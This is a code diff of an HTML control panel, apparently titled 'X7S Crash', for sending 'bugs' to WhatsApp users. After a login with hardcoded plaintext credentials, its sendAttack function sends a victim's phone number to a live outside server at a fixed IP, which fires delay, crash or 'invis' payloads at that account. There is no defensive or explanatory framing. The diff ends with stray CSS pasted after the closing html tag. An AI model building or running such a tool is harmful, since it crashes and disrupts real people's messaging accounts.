@@ -1,40 +1,231 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>APK BUG BY XYROO</title>
+  <title>X7S Crash</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     body {
+      margin: 0; padding: 0;
       font-family: Arial, sans-serif;
-      background: url('https://files.catbox.moe/gwu800.jpg') no-repeat center center fixed;
-      background-size: cover;
-      color: white;
-      text-align: center;
-      padding: 60px 20px;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      height: 100vh; display: flex; align-items: center; justify-content: center;
     }
-
-    h1 {
-      font-size: 80px;
-      font-weight: bold;
-      margin-bottom: 80px;
-      text-shadow: 4px 4px 12px #000;
+    .glass-box {
+      background: rgba(255,255,255,0.1);
+      border-radius: 15px; padding: 30px; width: 400px;
+      text-align: center; color: white;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+      backdrop-filter: blur(10px);
+      margin: 10px;
     }
-
-    input[type="text"], input[type="password"] {
-      padding: 25px;
-      font-size: 40px;
-      width: 95%;
-      max-width: 700px;
-      border-radius: 15px;
-      border: none;
-      margin-bottom: 40px;
-      text-align: center;
-      box-shadow: 0 0 15px #000;
+    h1 { margin-bottom: 20px; }
+    input, select {
+      width: 90%; padding: 10px; margin: 8px 0;
+      border: none; border-radius: 8px;
+      outline: none; text-align: center;
     }
+    button {
+      width: 95%; padding: 10px; margin-top: 15px;
+      border: none; border-radius: 8px;
+      background: #6a11cb; color: white; cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover { background: #2575fc; }
+    .neon { color: #fff; text-shadow: 0 0 5px #6a11cb, 0 0 10px #2575fc; }
+    #logBox {
+      margin-top: 15px; padding: 10px;
+      background: rgba(0,0,0,0.4); border-radius: 10px;
+      height: 120px; overflow-y: auto; font-size: 13px; text-align: left;
+    }
+    .log-success { color: #00ff99; }
+    .log-error { color: #ff5555; }
+  </style>
+</head>
+<body>
 
-    .button-group button, .login-box button {
-      margin: 25px;
-      padding: 25px 60px;
+<!-- Login Box -->
+<div id="login-box" class="glass-box">
+  <img src="https://files.catbox.moe/vqzawn.jpg" alt="logo" width="100" style="border-radius:50%; margin-bottom:15px;">
+  <h1>X7S CRASH</h1>
+  <input type="text" id="username" placeholder="Username">
+  <input type="password" id="password" placeholder="Password">
+  <button id="loginBtn"><i class="fas fa-sign-in-alt"></i> Login</button>
+  <div id="login-result"></div>
+</div>
+
+<!-- Main Dashboard -->
+<div class="glass-box" id="dashboard" style="display:none;">
+  <h1 class="neon">Dashboard</h1>
+  <p>Selamat datang, <span id="logged-user"></span> (<span id="logged-role"></span>)!</p>
+  
+  <select id="bugType">
+    <option value="delay">Delay</option>
+    <option value="crash">Crash</option>
+    <option value="invis">Invis</option>
+  </select>
+  
+  <input type="text" id="targetNumber" placeholder="628xxxx">
+  <button onclick="sendAttack()"><i class="fas fa-bug"></i> Kirim Bug</button>
+  <button onclick="logout()" style="background:#e63946;"><i class="fas fa-sign-out-alt"></i> Logout</button>
+  
+  <div id="logBox"></div>
+</div>
+
+<!-- Admin User Management -->
+<div class="glass-box" id="admin-panel" style="display:none;">
+  <h2>👑 User Management</h2>
+  <h3>Tambah User</h3>
+  <input type="text" id="newUser" placeholder="Username baru">
+  <input type="password" id="newPass" placeholder="Password baru">
+  <select id="newRole">
+    <option value="user">User</option>
+    <option value="admin">Admin</option>
+  </select>
+  <button onclick="addUser()"><i class="fas fa-user-plus"></i> Tambah User</button>
+
+  <h3>Hapus User</h3>
+  <input type="text" id="delUser" placeholder="Username yg dihapus">
+  <button onclick="deleteUser()"><i class="fas fa-user-minus"></i> Hapus User</button>
+</div>
+
+<script>
+// daftar user awal
+let USERS = [
+  { username: "xyroo", password: "1111", role: "admin" },
+  { username: "admin", password: "2222", role: "user" }
+];
+
+// API untuk tiap bug
+const BUG_API = {
+  Delay: "http://143.244.130.10:2168/saturn?type=saturnfc&chatId=",
+  Crash: "http://143.244.130.10:2168/saturn?type=crash&chatId=",
+  Invis: "http://143.244.130.10:2168/saturn?type=invis&chatId="
+};
+
+const loginBox = document.getElementById('login-box');
+const dashboard = document.getElementById('dashboard');
+const adminPanel = document.getElementById('admin-panel');
+const loginBtn = document.getElementById('loginBtn');
+const loginResult = document.getElementById('login-result');
+const loggedUser = document.getElementById('logged-user');
+const loggedRole = document.getElementById('logged-role');
+const logBox = document.getElementById('logBox');
+
+let currentUser = null;
+
+loginBtn.addEventListener('click', () => {
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value.trim();
+
+  const found = USERS.find(u => u.username === username && u.password === password);
+
+  if (found) {
+    loginBox.style.display = 'none';
+    dashboard.style.display = 'block';
+    currentUser = found;
+    loggedUser.innerText = found.username;
+    loggedRole.innerText = found.role;
+
+    // hanya admin yg bisa lihat user management
+    if (found.role === "admin") {
+      adminPanel.style.display = "block";
+    }
+  } else {
+    loginResult.innerText = '❌ Username atau password salah!';
+    loginResult.style.color = 'crimson';
+  }
+});
+
+function appendLog(msg, type="info") {
+  const div = document.createElement("div");
+  div.innerText = msg;
+  if (type === "success") div.classList.add("log-success");
+  if (type === "error") div.classList.add("log-error");
+  logBox.appendChild(div);
+  logBox.scrollTop = logBox.scrollHeight;
+}
+
+function sendAttack() {
+  const target = document.getElementById('targetNumber').value.trim();
+  const bugType = document.getElementById('bugType').value;
+  
+  if (!target) {
+    appendLog("⚠️ Masukkan nomor target!", "error");
+    return;
+  }
+
+  const apiBase = BUG_API[bugType];
+  if (!apiBase) {
+    appendLog("❌ API untuk bug ini belum diatur!", "error");
+    return;
+  }
+
+  const apiUrl = apiBase + target + "@s.whatsapp.net";
+
+  fetch(apiUrl)
+    .then(async res => {
+      let body;
+      try { body = await res.json(); } 
+      catch { body = await res.text(); }
+      if (res.ok) {
+        appendLog("✅ Attack ["+bugType+"] sukses → " + JSON.stringify(body), "success");
+      } else {
+        appendLog("❌ Gagal ["+bugType+"] (HTTP " + res.status + ") → " + JSON.stringify(body), "error");
+      }
+    })
+    .catch(err => {
+      appendLog("❌ Error koneksi: " + err, "error");
+    });
+}
+
+function logout() {
+  dashboard.style.display = 'none';
+  adminPanel.style.display = 'none';
+  loginBox.style.display = 'block';
+  currentUser = null;
+}
+
+// === Admin Functions ===
+function addUser() {
+  if (!currentUser || currentUser.role !== "admin") {
+    alert("❌ Hanya admin yang bisa menambah user!");
+    return;
+  }
+  const uname = document.getElementById("newUser").value.trim();
+  const pass = document.getElementById("newPass").value.trim();
+  const role = document.getElementById("newRole").value;
+
+  if (!uname || !pass) {
+    alert("⚠️ Username dan password tidak boleh kosong!");
+    return;
+  }
+  if (USERS.find(u => u.username === uname)) {
+    alert("❌ Username sudah ada!");
+    return;
+  }
+  USERS.push({ username: uname, password: pass, role: role });
+  alert("✅ User " + uname + " berhasil dibuat sebagai " + role);
+}
+
+function deleteUser() {
+  if (!currentUser || currentUser.role !== "admin") {
+    alert("❌ Hanya admin yang bisa menghapus user!");
+    return;
+  }
+  const uname = document.getElementById("delUser").value.trim();
+  const idx = USERS.findIndex(u => u.username === uname);
+  if (idx === -1) {
+    alert("❌ User tidak ditemukan!");
+    return;
+  }
+  USERS.splice(idx, 1);
+  alert("✅ User " + uname + " berhasil dihapus!");
+}
+</script>
+
+</body>
+</html>      padding: 25px 60px;
       font-size: 45px;
       font-weight: bold;
       border: none;
